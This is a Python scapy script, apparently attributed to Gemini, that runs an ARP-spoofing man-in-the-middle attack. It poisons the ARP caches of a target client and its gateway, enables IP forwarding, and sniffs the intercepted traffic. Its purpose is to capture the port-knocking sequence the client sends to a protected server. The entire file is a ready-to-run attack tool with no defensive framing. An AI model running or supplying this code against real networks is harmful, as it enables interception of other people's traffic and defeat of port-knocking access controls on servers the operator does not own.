#!/usr/bin/env python3

import scapy.all as scapy
import time
import argparse
import os
import sys
import threading
import ctypes
import subprocess
import platform

# Global variables
knock_sequence = []
detected_ports = set()
args = None  # Will store command line arguments

def is_admin():
    """Check if the script is running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def get_arguments():
    """Mengambil argumen dari command line."""
    parser = argparse.ArgumentParser(description="MITM Port Knocking Sequence Sniffer. By Gemini.")
    parser.add_argument("-t", "--target", dest="target_ip", required=True, help="IP address of the target client.")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", required=True, help="IP address of the network gateway/router.")
    parser.add_argument("-s", "--server", dest="server_ip", required=True, help="IP address of the server being knocked.")
    parser.add_argument("-i", "--interface", dest="interface", required=True, help="Network interface to use (e.g., eth0).")
    return parser.parse_args()

def enable_ip_forwarding(interface):
    """Enable IP forwarding based on the operating system."""
    print("[*] Enabling IP forwarding...")
    
    if platform.system().lower() == "windows":
        try:
            # Enable IPv4 forwarding on Windows
            subprocess.run(["netsh", "interface", "ipv4", "set", "interface", interface, "forwarding=enabled"], 
                         check=True, capture_output=True)
            print("[+] IP forwarding enabled successfully on Windows")
        except subprocess.CalledProcessError as e:
            print(f"[!] Failed to enable IP forwarding: {e}")
            print("[!] Make sure you're running as administrator and the interface name is correct")
            sys.exit(1)
    else:
        # Linux IP forwarding
        if os.path.exists("/proc/sys/net/ipv4/ip_forward"):
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
        else:
            print("[!] Cannot enable IP forwarding. File not found. Are you on Linux?")
            sys.exit(1)

def disable_ip_forwarding(interface):
    """Disable IP forwarding based on the operating system."""
    print("\n[*] Disabling IP forwarding...")
    
    if platform.system().lower() == "windows":
        try:
            # Disable IPv4 forwarding on Windows
            subprocess.run(["netsh", "interface", "ipv4", "set", "interface", interface, "forwarding=disabled"], 
                         check=True, capture_output=True)
            print("[+] IP forwarding disabled successfully")
        except subprocess.CalledProcessError as e:
            print(f"[!] Failed to disable IP forwarding: {e}")
    else:
        if os.path.exists("/proc/sys/net/ipv4/ip_forward"):
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0")

def get_mac(ip):
    """Mendapatkan alamat MAC dari sebuah IP menggunakan beberapa metode."""
    # Method 1: Check Windows ARP cache first (faster)
    try:
        import subprocess
        result = subprocess.run(['arp', '-a', ip], capture_output=True, text=True)
        if result.returncode == 0 and result.stdout:
            # Parse the MAC address from arp output
            lines = result.stdout.split('\n')
            for line in lines:
                if ip in line:
                    parts = line.split()
                    if len(parts) >= 2:
                        mac = parts[1].replace('-', ':')
                        return mac
    except Exception:
        pass
    
    # Method 2: Using ARP request via scapy
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        if answered_list:
            return answered_list[0][1].hwsrc
    except Exception:
        pass
    
    return None

def spoof(target_ip, spoof_ip):
    """Mengirim paket ARP spoof tunggal."""
    target_mac = get_mac(target_ip)
    spoof_mac = get_mac(spoof_ip)  # Get MAC of the IP we're spoofing
    
    if not target_mac or not spoof_mac:
        return False
        
    # Create the Ethernet frame with proper destination MAC
    ether = scapy.Ether(dst=target_mac, src=spoof_mac)
    # Create the ARP packet
    arp = scapy.ARP(
        op=2,  # ARP Reply
        pdst=target_ip,  # Target IP
        hwdst=target_mac,  # Target MAC
        psrc=spoof_ip,  # Spoofed Source IP
        hwsrc=spoof_mac  # Spoofed Source MAC
    )
    # Combine and send
    packet = ether / arp
    try:
        scapy.sendp(packet, verbose=False)
        return True
    except Exception as e:
        print(f"[!] Failed to send ARP packet: {e}")
        return False

def restore_arp(destination_ip, source_ip):
    """Mengembalikan cache ARP ke kondisi normal."""
    try:
        destination_mac = get_mac(destination_ip)
        source_mac = get_mac(source_ip)
        if not destination_mac or not source_mac:
            print(f"[!] Could not get MAC addresses for restoring ARP. Skipping restore for {destination_ip} <-> {source_ip}")
            return
            
        # Create the Ethernet frame with proper destination MAC
        ether = scapy.Ether(dst=destination_mac)
        # Create the ARP packet
        arp = scapy.ARP(
            op=2,  # ARP Reply
            pdst=destination_ip,  # Target IP
            hwdst=destination_mac,  # Target MAC
            psrc=source_ip,  # Real Source IP
            hwsrc=source_mac  # Real Source MAC
        )
        # Combine and send
        packet = ether / arp
        scapy.sendp(packet, count=4, verbose=False)
        print(f"[+] Restored ARP for {destination_ip} <-> {source_ip}")
    except Exception as e:
        print(f"[!] Error restoring ARP for {destination_ip} <-> {source_ip}: {e}")

def packet_sniffer(packet):
    """Fungsi callback untuk memproses setiap paket yang di-sniff."""
    global knock_sequence
    global detected_ports
    global args
    
    try:
        # Debug: Print semua paket yang mengandung IP
        if packet.haslayer(scapy.IP):
            src_ip = packet[scapy.IP].src
            dst_ip = packet[scapy.IP].dst
            
            # Print info paket IP
            print(f"\n[DEBUG] IP Packet: {src_ip} -> {dst_ip}")
            
            # Jika paket mengandung TCP
            if packet.haslayer(scapy.TCP):
                src_port = packet[scapy.TCP].sport
                dst_port = packet[scapy.TCP].dport
                flags = packet[scapy.TCP].flags
                print(f"[DEBUG] TCP: {src_ip}:{src_port} -> {dst_ip}:{dst_port} [Flags: {flags}]")
                
                # Deteksi port knocking: Cek paket yang menuju ke server target
                if dst_ip == args.server_ip:
                    print(f"[DEBUG] Potential knock detected to port {dst_port}")
                    
                    # Tambahkan ke sequence jika belum ada
                    if dst_port not in detected_ports:
                        knock_sequence.append(dst_port)
                        detected_ports.add(dst_port)
                        print(f"\n[!!!] New knock detected!")
                        print(f"[!!!] Port: {dst_port}")
                        print(f"[!!!] From: {src_ip}:{src_port}")
                        print(f"[!!!] To: {dst_ip}:{dst_port}")
                        print(f"[!!!] TCP Flags: {flags}")
                        print(f"[!!!] Current knock sequence: {knock_sequence}")
                        
                        # Jika sudah ada beberapa port
                        if len(knock_sequence) >= 1:
                            print("\n[!!!] Current knock sequence detected!")
                            print(f"[!!!] Full sequence so far: {knock_sequence}")
                
    except Exception as e:
        print(f"[!] Error processing packet: {e}")

def arp_spoof_thread(target_ip, gateway_ip):
    """Thread untuk terus menerus melakukan ARP spoofing."""
    try:
        print("[*] Starting ARP spoofing...")
        print("[*] Waiting for port knock sequence...")
        fails = 0
        while True:
            success1 = spoof(target_ip, gateway_ip)
            success2 = spoof(gateway_ip, target_ip)
            
            if success1 and success2:
                fails = 0
                time.sleep(2)
            else:
                fails += 1
                if fails >= 5:
                    print("[!] Too many consecutive failures. Checking network status...")
                    if not get_mac(target_ip) and not get_mac(gateway_ip):
                        print("[!] Cannot reach both target and gateway. Network might be down.")
                        time.sleep(10)
                    fails = 0
    except KeyboardInterrupt:
        print("\n[*] ARP spoofing thread stopped.")

def main():
    global args
    
    if not is_admin():
        print("[!] This script must be run as administrator. Please run with admin privileges.")
        sys.exit(1)

    args = get_arguments()
    enable_ip_forwarding(args.interface)

    # Membuat dan memulai thread untuk ARP spoofing
    spoofer = threading.Thread(target=arp_spoof_thread, args=(args.target_ip, args.gateway_ip))
    spoofer.daemon = True # Memastikan thread berhenti saat program utama berhenti
    spoofer.start()
    
    print(f"\n[*] Starting MITM attack...")
    print(f"[*] Target IP (knocking from): {args.target_ip}")
    print(f"[*] Server IP (knocking to): {args.server_ip}")
    print(f"[*] Gateway IP: {args.gateway_ip}")
    print(f"[*] Interface: {args.interface}")
    print("\n[*] Waiting for port knocking attempts...")
    print("[*] Press CTRL+C to stop")

    try:
        # Tangkap semua paket IP untuk debugging
        bpf_filter = "ip"
        print(f"[*] Starting packet capture with filter: {bpf_filter}")
        scapy.sniff(iface=args.interface, store=False, prn=packet_sniffer, filter=bpf_filter)
    except KeyboardInterrupt:
        print("\n[*] Detected CTRL+C. Shutting down...")
    except Exception as e:
        print(f"\n[!] An error occurred during sniffing: {e}")
    finally:
        try:
            # Cleanup: Disable IP forwarding
            print("\n[*] Cleaning up...")
            disable_ip_forwarding(args.interface)
            
            # Cleanup: Restore ARP tables
            print("[*] Restoring ARP tables...")
            restore_arp(args.target_ip, args.gateway_ip)
            restore_arp(args.gateway_ip, args.target_ip)
            
            # Display results
            if knock_sequence:
                print("\n[+] Port knock sequence detected!")
                print("[+] Sequence (in order):", ", ".join(map(str, knock_sequence)))
                print("[+] Total unique ports knocked:", len(knock_sequence))
            else:
                print("\n[!] No port knock sequence was detected")
                
        except Exception as e:
            print(f"[!] Error during cleanup: {e}")
        finally:
            print("[+] Script terminated.")

if __name__ == "__main__":
    main()
